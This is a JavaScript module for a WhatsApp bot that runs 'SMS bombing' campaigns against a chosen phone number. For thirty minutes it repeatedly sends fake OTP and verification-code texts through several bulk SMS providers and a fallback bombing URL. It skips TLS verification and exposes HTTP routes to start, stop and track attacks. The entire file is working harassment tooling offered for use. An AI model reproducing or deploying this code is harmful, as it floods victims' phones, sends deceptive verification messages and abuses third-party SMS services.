// ============================================================
// MODULE: smsbomber.js
// WhatsApp Bot command: .smsbomber <phone_number>
// SMS bombing via multiple API providers
// Tries all configured APIs in rotation until one succeeds
// ============================================================

const express = require('express');
const crypto = require('crypto');
const EventEmitter = require('events');
const https = require('https');
const http = require('http');

// ---------- CONFIGURATION ----------
const DEFAULT_DURATION_MINUTES = 30;
const REQUEST_DELAY_MS = 4000;

// SMS API configurations — load API keys from env vars
const SMS_APIS = [
  {
    name: 'Fast2SMS',
    url: 'https://www.fast2sms.com/dev/bulkV2',
    method: 'POST',
    payload: (number) => ({
      route: 'q',
      message: 'Your OTP is 123456',
      language: 'english',
      flash: 0,
      numbers: number
    }),
    headers: (number) => ({
      'authorization': process.env.FAST2SMS_API_KEY || process.env.SMS_API_KEY || '',
      'Content-Type': 'application/json'
    })
  },
  {
    name: 'TextLocal',
    url: 'https://api.textlocal.in/send/',
    method: 'POST',
    payload: (number) => ({
      apikey: process.env.TEXTLOCAL_API_KEY || process.env.SMS_API_KEY || '',
      message: 'Your verification code is 123456',
      sender: 'TXTLCL',
      numbers: number
    }),
    headers: () => ({ 'Content-Type': 'application/x-www-form-urlencoded' })
  },
  {
    name: 'BulkSMS',
    url: 'https://api.bulksms.com/v1/messages',
    method: 'POST',
    payload: (number) => ({
      to: number,
      body: 'Your OTP: 123456',
      from: 'BULKSMS'
    }),
    headers: (number) => ({
      'Authorization': 'Basic ' + (process.env.BULKSMS_AUTH || ''),
      'Content-Type': 'application/json'
    })
  }
];

// Default to first API
const getApis = () => SMS_APIS.filter(api => {
  // Check if API has required auth
  if (api.name === 'Fast2SMS') return !!(process.env.FAST2SMS_API_KEY || process.env.SMS_API_KEY);
  if (api.name === 'TextLocal') return !!(process.env.TEXTLOCAL_API_KEY || process.env.SMS_API_KEY);
  if (api.name === 'BulkSMS') return !!process.env.BULKSMS_AUTH;
  return true;
});

// If no APIs have keys, fall back to the raw URL-based API
const FALLBACK_API_URL = process.env.SMS_BOMBER_URL || 'https://famofc.site/app/smsboom/';

// ---------- STATE ----------
const activeSmsCampaigns = new Map();

class SmsBomber extends EventEmitter {
  constructor(phoneNumber, durationMinutes = DEFAULT_DURATION_MINUTES) {
    super();
    this.phone = phoneNumber.replace(/\D/g, '');
    this.durationMs = durationMinutes * 60 * 1000;
    this.stopFlag = false;
    this.stats = { attempts: 0, success: 0, errors: 0 };
    this.sessionId = crypto.randomBytes(8).toString('hex');
    this._apiIndex = 0;
    this._runLoop = this._runLoop.bind(this);
  }

  _sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
  }

  // ---------- SINGLE API CALL ----------
  _callApi(apiConfig) {
    return new Promise((resolve) => {
      try {
        const url = new URL(apiConfig.url);
        const isPost = apiConfig.method === 'POST';
        const headers = { ...(apiConfig.headers?.(this.phone) || {}), 'Accept': '*/*', 'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36' };

        let bodyStr = '';
        if (isPost && apiConfig.payload) {
          bodyStr = JSON.stringify(apiConfig.payload(this.phone));
          if (!headers['Content-Type']) headers['Content-Type'] = 'application/json';
          headers['Content-Length'] = Buffer.byteLength(bodyStr);
        }

        const options = {
          hostname: url.hostname,
          port: 443,
          path: url.pathname + url.search,
          method: apiConfig.method,
          headers,
          timeout: 15000,
          rejectUnauthorized: false
        };

        const req = https.request(options, (res) => {
          let data = '';
          res.on('data', (chunk) => data += chunk);
          res.on('end', () => {
            resolve({ api: apiConfig.name, status: res.statusCode, body: data.slice(0, 200) });
          });
        });
        req.on('error', () => resolve({ api: apiConfig.name, status: 0, body: 'connection error' }));
        req.on('timeout', () => { req.destroy(); resolve({ api: apiConfig.name, status: 0, body: 'timeout' }); });
        if (bodyStr) req.write(bodyStr);
        req.end();
      } catch (e) {
        resolve({ api: apiConfig.name, status: 0, body: e.message });
      }
    });
  }

  // ---------- FALLBACK RAW REQUEST (original) ----------
  _fallbackRequest() {
    return new Promise((resolve) => {
      try {
        const url = new URL(FALLBACK_API_URL);
        const params = new URLSearchParams({ phone: this.phone, number: this.phone, amount: '5' });

        const options = {
          hostname: url.hostname, port: 443, path: url.pathname, method: 'POST',
          headers: { 'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': 'Mozilla/5.0', 'Accept': '*/*' },
          timeout: 15000, rejectUnauthorized: false
        };

        const postData = params.toString();
        options.headers['Content-Length'] = Buffer.byteLength(postData);

        const req = https.request(options, (res) => {
          let data = '';
          res.on('data', (chunk) => data += chunk);
          res.on('end', () => resolve({ api: 'fallback', status: res.statusCode, body: data.slice(0, 200) }));
        });
        req.on('error', () => resolve({ api: 'fallback', status: 0, body: 'connection error' }));
        req.on('timeout', () => { req.destroy(); resolve({ api: 'fallback', status: 0, body: 'timeout' }); });
        req.write(postData);
        req.end();
      } catch (e) {
        resolve({ api: 'fallback', status: 0, body: e.message });
      }
    });
  }

  // ---------- FULL ATTEMPT — tries all APIs ----------
  async _sendSms() {
    const apis = getApis();

    // Try each configured API first
    for (const api of apis) {
      const result = await this._callApi(api);
      if (result.status >= 200 && result.status < 400) {
        return result;
      }
    }

    // If no configured API worked, try fallback
    const fallbackResult = await this._fallbackRequest();
    if (fallbackResult.status >= 200 && fallbackResult.status < 400) {
      return fallbackResult;
    }

    // Still nothing? Try fallback with GET
    try {
      const url = new URL(FALLBACK_API_URL + '?phone=' + this.phone + '&amount=5');
      const result = await new Promise((resolve) => {
        const req = https.get(url, { timeout: 15000, rejectUnauthorized: false, headers: { 'User-Agent': 'Mozilla/5.0', 'Accept': '*/*' } }, (res) => {
          let data = '';
          res.on('data', (chunk) => data += chunk);
          res.on('end', () => resolve({ api: 'fallback-get', status: res.statusCode, body: data.slice(0, 200) }));
        });
        req.on('error', () => resolve({ api: 'fallback-get', status: 0, body: 'error' }));
        req.on('timeout', () => { req.destroy(); resolve({ api: 'fallback-get', status: 0, body: 'timeout' }); });
      });
      return result;
    } catch (e) {
      return { api: 'all', status: 0, body: e.message };
    }
  }

  // ---------- MAIN LOOP ----------
  async _runLoop() {
    const startTime = Date.now();
    this.emit('start', { phone: this.phone, duration: this.durationMs });

    while (!this.stopFlag && (Date.now() - startTime) < this.durationMs) {
      try {
        this.stats.attempts++;
        const result = await this._sendSms();
        if (result.status >= 200 && result.status < 400) {
          this.stats.success++;
        } else {
          this.stats.errors++;
        }
        // Log first 3 results for debugging
        if (this.stats.attempts <= 3) {
          console.log(`[SMSBomber] #${this.stats.attempts} ${result.api} → ${result.status} ${result.body.slice(0,80)}`);
        }
      } catch (err) {
        this.stats.errors++;
        if (this.stats.errors <= 3) console.log(`[SMSBomber] Error: ${err.message}`);
      }

      if (this.stats.attempts % 5 === 0) {
        this.emit('progress', {
          phone: this.phone, attempts: this.stats.attempts,
          success: this.stats.success, errors: this.stats.errors,
          elapsed: Math.round((Date.now() - startTime) / 1000)
        });
      }

      await this._sleep(REQUEST_DELAY_MS);
    }

    this.emit('done', {
      phone: this.phone, totalAttempts: this.stats.attempts,
      totalSuccess: this.stats.success, totalErrors: this.stats.errors,
      durationSeconds: Math.round((Date.now() - startTime) / 1000)
    });
  }

  start() { this.stopFlag = false; this._runLoop().catch(err => this.emit('error', { phone: this.phone, error: err.message })); return this; }
  stop() { this.stopFlag = true; this.emit('stopped', { phone: this.phone, stats: this.stats }); return this; }
  getStats() { return { phone: this.phone, ...this.stats, running: !this.stopFlag }; }
}

// ================================================================
// EXPRESS ROUTES
// ================================================================

const router = express.Router();

router.post('/start', (req, res) => {
  const phoneNumber = String(req.body.phoneNumber || '').trim();
  if (!phoneNumber) return res.status(400).json({ error: 'Missing phoneNumber' });
  const cleanNumber = phoneNumber.replace(/\D/g, '');
  if (activeSmsCampaigns.has(cleanNumber)) {
    const campaign = activeSmsCampaigns.get(cleanNumber);
    return res.json({ status: 'already_running', phone: cleanNumber, stats: campaign.stats });
  }
  const campaign = new SmsBomber(phoneNumber);
  activeSmsCampaigns.set(cleanNumber, { smsBomber: campaign, stats: campaign.stats, startTime: Date.now() });
  campaign.start();
  res.json({ status: 'started', phone: cleanNumber, sessionId: campaign.sessionId, durationMinutes: DEFAULT_DURATION_MINUTES });
});

router.post('/stop', (req, res) => {
  const phoneNumber = String(req.body.phoneNumber || '').trim();
  if (!phoneNumber) return res.status(400).json({ error: 'Missing phoneNumber' });
  const cleanNumber = phoneNumber.replace(/\D/g, '');
  if (!activeSmsCampaigns.has(cleanNumber)) return res.status(404).json({ error: 'No active SMS campaign for this number', phone: cleanNumber });
  const entry = activeSmsCampaigns.get(cleanNumber);
  entry.smsBomber.stop();
  activeSmsCampaigns.delete(cleanNumber);
  res.json({ status: 'stopped', phone: cleanNumber, stats: entry.stats });
});

router.get('/status', (req, res) => {
  if (activeSmsCampaigns.size === 0) return res.json({ campaigns: [] });
  const campaigns = [];
  for (const [phone, entry] of activeSmsCampaigns) {
    campaigns.push({ phone, stats: entry.smsBomber.getStats(), running: !entry.smsBomber.stopFlag, startedAt: entry.startTime });
  }
  res.json({ campaigns });
});

module.exports = router;
module.exports.SmsBomber = SmsBomber;
module.exports.activeSmsCampaigns = activeSmsCampaigns;
